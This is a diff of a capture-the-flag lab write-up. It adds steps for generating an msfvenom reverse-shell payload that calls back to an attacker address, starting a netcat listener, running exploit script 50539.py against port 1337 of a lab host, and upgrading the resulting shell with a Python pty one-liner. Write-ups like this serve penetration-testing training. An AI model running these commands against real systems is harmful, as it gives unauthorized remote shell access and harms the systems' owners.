@@ -155,14 +155,20 @@ Nmap done: 1 IP address (1 host up) scanned in 22.51 seconds
 ```CSS
 ▶ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 PrependFork=true -o reverseshell.bin
 ```
+![image](https://user-images.githubusercontent.com/83878909/237010063-9634ca3f-ff62-494c-88c3-6ab680e31d22.png)
 
   - Start a `netcat` listener on port `4444`.
 ```CSS
 ▶ nc -nlvvp 4444
 ```
 
-  - Run the exploit.
+  - Run the exploit and upgrade the shell to TTY.
 ```CSS
 ▶ python 50539.py 10.10.11.125:1337 reverseshell.bin
 ```
+```CSS
+python3 -c "import pty;pty.spawn('/bin/bash')"
+```
+![image](https://user-images.githubusercontent.com/83878909/237010455-b85bcdc2-76ae-4b17-9a76-b9cb3824a879.png)
+![image](https://user-images.githubusercontent.com/83878909/237010693-06fa72f5-3f63-4398-90b7-91de222883b1.png)
 
